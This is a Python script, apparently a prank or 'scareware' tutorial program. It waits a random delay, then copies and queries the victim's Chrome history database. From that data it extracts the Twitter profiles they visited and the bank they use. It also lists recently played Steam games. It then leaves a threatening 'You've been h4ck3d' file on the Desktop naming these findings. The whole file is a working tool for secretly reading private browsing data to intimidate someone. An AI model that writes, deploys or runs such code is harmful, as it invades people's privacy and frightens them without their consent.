import os
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob


HACKER_FILE_NAME = "README.txt"


def get_user_path():
    return "{}/".format(Path.home())


def check_steam_games(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("You've played {}... interesting...".format(", ".join(games[:3])))


def delay_action():
    n_hours = randrange(1, 4) # modify this to play with the delay time
    print("speeling {} hours".format(n_hours))
    sleep(n_hours)  # * 60 * 60)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("You've been h4ck3d.\n")
    return hacker_file


# We are using the default chrome DB path, it's sqlite so we will use a simple query to get the last url's
def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Error, retrying in 5 seg.") 
            sleep(5)


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("You've stalked {} on twitter...\n".format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hacker_file.write("I also see that you save money on {}... Take care.\n".format(his_bank))


def main():
    # Delay the app
    delay_action() # you can comment this to run the script without delay or modify the time on line 29
    # Get windows Path
    user_path = get_user_path()
    # Read Chrome history with sqlite when possible
    chrome_history = get_chrome_history(user_path)
    # Create file on Desktop
    hacker_file = create_hacker_file(user_path)
    # Write messages
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
